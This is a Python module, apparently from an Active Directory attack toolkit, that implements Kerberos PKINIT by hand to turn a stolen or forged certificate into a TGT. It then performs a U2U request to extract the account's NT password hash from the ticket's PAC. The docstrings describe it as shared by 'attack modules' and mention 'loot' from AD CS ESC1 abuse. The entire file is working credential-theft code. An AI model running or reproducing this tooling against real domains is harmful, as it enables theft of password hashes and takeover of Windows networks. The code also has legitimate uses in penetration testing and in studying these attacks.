"""PKINIT wire core (RFC 4556, DH flavor) shared by attack modules.

request_tgt(): certificate + key -> TGT (AS-REP bytes, reply key,
session key). unpac_nthash(): the NT hash out of a U2U ticket's PAC
(PAC_CREDENTIAL_INFO, usage 16). The CMS SignedData is hand-assembled
DER — Windows validates the exact shape. Modules own printing, loot,
and option handling; this layer owns the wire.
"""



import datetime
import hashlib
import random
import secrets

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
except ImportError:
    x509 = None
try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AD_IF_RELEVANT,
        AS_REQ,
        AS_REP,
        TGS_REP,
        TGS_REQ,
        AP_REQ,
        KERB_PA_PAC_REQUEST,
        Authenticator,
        EncASRepPart,
        EncTicketPart,
        Ticket as TicketAsn1,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.pac import (
        NTLM_SUPPLEMENTAL_CREDENTIAL,
        PAC_CREDENTIAL_DATA,
        PAC_CREDENTIAL_INFO,
        PAC_INFO_BUFFER,
        PACTYPE,
    )
    from impacket.krb5.types import KerberosTime, Principal, Ticket
    from impacket.dcerpc.v5.rpcrt import TypeSerialization1
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
except ImportError:
    constants = None  # console gates run() on requirements

# RFC 5114 1024-bit group — the static DH params AD expects (generating
# fresh ones gets rejected as "unsafe"; every PKINIT tool ships these)
DH_P = int(
    "00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc740"
    "20bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374f"
    "e1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7ede"
    "e386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff", 16)
DH_G = 2

OID_SHA1 = "1.3.14.3.2.26"
OID_RSA = "1.2.840.113549.1.1.1"
OID_SIGNED_DATA = "1.2.840.113549.1.7.2"
OID_DH = "1.2.840.10046.2.1"
OID_PKINIT_AUTH = "1.3.6.1.5.2.3.1"
OID_PKINIT_KDCDH = "1.3.6.1.5.2.3.2"
OID_CONTENT_TYPE = "1.2.840.113549.1.9.3"
OID_MESSAGE_DIGEST = "1.2.840.113549.1.9.4"

PA_PK_AS_REQ = 16
PA_PK_AS_REP = 17
USAGE_AS_REP_PKINIT = 3
USAGE_TGS_REP_TICKET = 2
USAGE_PAC_CREDENTIAL = 16


# ---------------------------------------------------------------------------
# minimal DER toolkit (tlv in, tlv out — no library quirks in the CMS path)

def _length(n):
    if n < 0x80:
        return bytes([n])
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _tlv(tag, content):
    return bytes([tag]) + _length(len(content)) + content


def _seq(content):
    return _tlv(0x30, content)


def _set(content):
    return _tlv(0x31, content)


def _ctx(n, content):
    return _tlv(0xA0 + n, content)


def _oid(dotted):
    parts = [int(p) for p in dotted.split(".")]
    out = bytes([40 * parts[0] + parts[1]])
    for part in parts[2:]:
        chunk = [part & 0x7F]
        part >>= 7
        while part:
            chunk.insert(0, 0x80 | (part & 0x7F))
            part >>= 7
        out += bytes(chunk)
    return _tlv(0x06, out)


def _int(n):
    body = n.to_bytes(max(1, (n.bit_length() + 7) // 8), "big")
    if body[0] & 0x80:
        body = b"\x00" + body
    return _tlv(0x02, body)


def _octet(data):
    return _tlv(0x04, data)


def _bitstring(data):
    return _tlv(0x03, b"\x00" + data)


def _gtime(moment):
    return _tlv(0x18, moment.strftime("%Y%m%d%H%M%SZ").encode())


def _null():
    return b"\x05\x00"


def _read_tlv(data, pos=0):
    """(tag, content, next_pos) — one DER TLV."""
    tag = data[pos]
    first = data[pos + 1]
    if first & 0x80:
        size = int.from_bytes(data[pos + 2:pos + 2 + (first & 0x7F)], "big")
        start = pos + 2 + (first & 0x7F)
    else:
        size = first
        start = pos + 2
    return tag, data[start:start + size], start + size


# ---------------------------------------------------------------------------
# PKINIT structures

def build_authpack(req_body_der, dh_pub, client_nonce, nonce, moment):
    """AuthPack ::= { pkAuthenticator, [0] SPKI, [2] clientDHNonce }."""
    pk_auth = _seq(
        _ctx(0, _int(moment.microsecond)) +
        _ctx(1, _gtime(moment)) +
        _ctx(2, _int(nonce)) +
        _ctx(3, _octet(hashlib.sha1(req_body_der).digest())))
    spki = _seq(
        _seq(_oid(OID_DH) + _seq(_int(DH_P) + _int(DH_G) + _int(0))) +
        _bitstring(_int(dh_pub)))
    return _seq(pk_auth + _ctx(0, spki) + _ctx(2, _octet(client_nonce)))


def cms_signed_data(content_der, content_oid, cert, key):
    """ContentInfo{signedData} over content_der, signed by cert/key —
    the exact SignedData shape Windows' KDC validates."""
    digest = hashlib.sha1(content_der).digest()
    encap = _seq(_oid(content_oid) + _ctx(0, _octet(content_der)))
    attrs = _set(
        _seq(_oid(OID_CONTENT_TYPE) + _set(_oid(content_oid))) +
        _seq(_oid(OID_MESSAGE_DIGEST) + _set(_octet(digest))))
    signature = key.sign(attrs, padding.PKCS1v15(), hashes.SHA1())
    signer = _seq(
        _int(1) +
        _seq(cert.issuer.public_bytes() + _int(cert.serial_number)) +
        _seq(_oid(OID_SHA1) + _null()) +
        _ctx(0, attrs) +
        _seq(_oid(OID_RSA) + _null()) +
        _octet(signature))
    cert_der = cert.public_bytes(serialization.Encoding.DER)
    signed = _seq(
        _int(3) +
        _set(_seq(_oid(OID_SHA1) + _null())) +
        encap +
        _ctx(0, cert_der) +
        _set(signer))
    return _seq(_oid(OID_SIGNED_DATA) + _ctx(0, signed))


def build_pa_pk_as_req(authpack_der, cert, key):
    """PA-PK-AS-REQ padata-value ::= SEQUENCE { [0] ContentInfo }."""
    cms = cms_signed_data(authpack_der, OID_PKINIT_AUTH, cert, key)
    return _seq(_ctx(0, cms))


def truncate_key(value, size):
    """RFC 4556 KDF: SHA-1 counter expansion of the DH result."""
    out = b""
    counter = 0
    while len(out) < size:
        out += hashlib.sha1(bytes([counter]) + value).digest()
        counter += 1
    return out[:size]


def parse_dh_rep_info(data):
    """(kdc_pub, server_nonce) out of PA-PK-AS-REP's padata-value:
    DHRepInfo ::= SEQUENCE { [0] ContentInfo, [1] DHNonce OPTIONAL }."""
    tag, body, _ = _read_tlv(data)
    assert tag == 0x30, "DHRepInfo must be a SEQUENCE"
    server_nonce = b""
    kdc_pub = None
    pos = 0
    while pos < len(body):
        tag, content, pos = _read_tlv(body, pos)
        if tag == 0xA0:  # dhSignedData ContentInfo
            kdc_pub = _extract_kdc_pub(content)
        elif tag == 0xA1:
            _t, server_nonce, _ = _read_tlv(content)
    return kdc_pub, server_nonce


def _extract_kdc_pub(content_info):
    """Pull subjectPublicKey out of the KDC's signed KDCDHKeyInfo."""
    tag, sdata, _ = _read_tlv(content_info)  # ContentInfo SEQUENCE
    assert tag == 0x30
    pos = 0
    _t, _oid_val, pos = _read_tlv(sdata, pos)  # signedData OID
    _t, wrapped, _ = _read_tlv(sdata, pos)   # [0] EXPLICIT
    _t, signed, _ = _read_tlv(wrapped)       # SignedData SEQUENCE
    pos = 0
    _t, _ver, pos = _read_tlv(signed, pos)
    _t, _algs, pos = _read_tlv(signed, pos)
    _t, encap, _ = _read_tlv(signed, pos)    # encapContentInfo
    _t, _oid_val, pos = _read_tlv(encap, pos)
    _t, wrapped, _ = _read_tlv(encap, pos)   # [0] EXPLICIT
    _t, keyinfo, _ = _read_tlv(wrapped)      # OCTET STRING
    _t, kdcdh, _ = _read_tlv(keyinfo)        # KDCDHKeyInfo SEQUENCE
    _t, wrapped, _ = _read_tlv(kdcdh, 0)     # [0] BIT STRING
    _t, bits, _ = _read_tlv(wrapped)         # BIT STRING
    int_der = bytes(bits[1:])                # skip the unused-bits byte
    _t, raw, _ = _read_tlv(int_der)          # INTEGER
    return int.from_bytes(raw, "big")


def parse_pem_bundle(data):
    """(cert, key) from a PEM blob that holds both (esc1's loot shape)."""
    cert = x509.load_pem_x509_certificate(data)
    key = serialization.load_pem_private_key(data, password=None)
    return cert, key




class PkinitError(Exception):
    """Any PKINIT wire failure, with a human-readable reason."""


def request_tgt(host, domain, user, cert, key):
    """(asrep_bytes, reply_key, session_key, etype) via RFC 4556 DH.
    Raises PkinitError on any refusal or unexpected KDC answer."""
    now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
    nonce = secrets.randbits(31)
    client_nonce = secrets.token_bytes(32)
    dh_x = secrets.randbits(256)
    dh_pub = pow(DH_G, dh_x, DH_P)

    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    req_body = seq_set(as_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(req_body, "cname",
            Principal(user, type=constants.PrincipalNameType
                      .NT_PRINCIPAL.value).components_to_asn1)
    req_body["realm"] = domain.upper()
    seq_set(req_body, "sname",
            Principal(f"krbtgt/{domain.upper()}", type=constants
                      .PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["nonce"] = nonce
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))
    req_body_der = encoder.encode(req_body)

    authpack = build_authpack(req_body_der, dh_pub, client_nonce,
                              secrets.randbits(31), now)
    pk_req = build_pa_pk_as_req(authpack, cert, key)

    pac_req = KERB_PA_PAC_REQUEST()
    pac_req["include-pac"] = True
    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req["padata"][0]["padata-value"] = encoder.encode(pac_req)
    as_req["padata"][1] = noValue
    as_req["padata"][1]["padata-type"] = PA_PK_AS_REQ
    as_req["padata"][1]["padata-value"] = pk_req

    try:
        asrep_bytes = sendReceive(encoder.encode(as_req), domain.upper(), host)
    except Exception as e:
        raise PkinitError(f"KDC refused the PKINIT request - {e}")

    as_rep = decoder.decode(asrep_bytes, asn1Spec=AS_REP())[0]
    dh_info = None
    for pa in as_rep["padata"]:
        if int(pa["padata-type"]) == PA_PK_AS_REP:
            dh_info = bytes(pa["padata-value"])
            break
    if dh_info is None:
        raise PkinitError("no PA-PK-AS-REP in the answer — the KDC didn't "
                          "do PKINIT (Debian's Samba KDC has none)")
    kdc_pub, server_nonce = parse_dh_rep_info(dh_info)
    shared = pow(kdc_pub, dh_x, DH_P).to_bytes(128, "big")
    etype = int(as_rep["enc-part"]["etype"])
    sizes = {18: 32, 17: 16}
    if etype not in sizes:
        raise PkinitError(f"reply etype {etype} unsupported (RC4 reply)")
    reply_key = truncate_key(shared + client_nonce + server_nonce,
                             sizes[etype])
    cipher = _enctype_table[etype]
    plain = cipher.decrypt(Key(etype, reply_key), USAGE_AS_REP_PKINIT,
                           as_rep["enc-part"]["cipher"])
    enc_part = decoder.decode(plain, asn1Spec=EncASRepPart())[0]
    session_key = Key(int(enc_part["key"]["keytype"]),
                      bytes(enc_part["key"]["keyvalue"]))
    return asrep_bytes, reply_key, session_key, etype


def unpac_nthash(host, domain, user, reply_key, session_key, asrep_bytes):
    """U2U PAC_CREDENTIAL_INFO -> hex NT hash (None when absent).
    Raises PkinitError on wire failure."""
    decoded_tgt = decoder.decode(asrep_bytes, asn1Spec=AS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = str(decoded_tgt["crealm"])
    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)
    now = datetime.datetime.now(datetime.timezone.utc)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    cipher = _enctype_table[session_key.enctype]
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = cipher.encrypt(
        session_key, 7, encoder.encode(authenticator), None)

    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)
    req_body = seq_set(tgs_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.canonicalize.value,
        constants.KDCOptions.enc_tkt_in_skey.value,
    ])
    seq_set(req_body, "sname",
            Principal(user, type=constants.PrincipalNameType
                      .NT_UNKNOWN.value).components_to_asn1)
    req_body["realm"] = str(decoded_tgt["crealm"])
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        session_key.enctype,
        int(constants.EncryptionTypes.rc4_hmac.value),
    ))
    seq_set_iter(req_body, "additional-tickets",
                 (ticket.to_asn1(TicketAsn1()),))

    try:
        tgs_bytes = sendReceive(encoder.encode(tgs_req), domain.upper(), host)
    except Exception as e:
        raise PkinitError(f"U2U request failed - {e}")
    tgs_rep = decoder.decode(tgs_bytes, asn1Spec=TGS_REP())[0]
    ticket_cipher = _enctype_table[int(tgs_rep["ticket"]["enc-part"]["etype"])]
    plain = ticket_cipher.decrypt(session_key, USAGE_TGS_REP_TICKET,
                                  tgs_rep["ticket"]["enc-part"]["cipher"])
    return _nthash_from_pac(plain, reply_key)


def _nthash_from_pac(ticket_plain, reply_key):
    enc_part = decoder.decode(ticket_plain, asn1Spec=EncTicketPart())[0]
    ad = decoder.decode(enc_part["authorization-data"][0]["ad-data"],
                        asn1Spec=AD_IF_RELEVANT())[0]
    pac = PACTYPE(ad[0]["ad-data"].asOctets())
    buffers = pac["Buffers"]
    for _ in range(pac["cBuffers"]):
        info = PAC_INFO_BUFFER(buffers)
        data = pac["Buffers"][info["Offset"] - 8:][:info["cbBufferSize"]]
        if info["ulType"] != 2:
            buffers = buffers[len(info):]
            continue
        cred_info = PAC_CREDENTIAL_INFO(data)
        cipher = _enctype_table[cred_info["EncryptionType"]]
        out = cipher.decrypt(Key(18, reply_key), USAGE_PAC_CREDENTIAL,
                             cred_info["SerializedData"])
        type1 = TypeSerialization1(out)
        cred_data = PAC_CREDENTIAL_DATA(out[len(type1) + 4:])
        for cred in cred_data["Credentials"]:
            struct_ = NTLM_SUPPLEMENTAL_CREDENTIAL(
                b"".join(cred["Credentials"]))
            return bytes(struct_["NtPassword"]).hex()
        return None
    return None
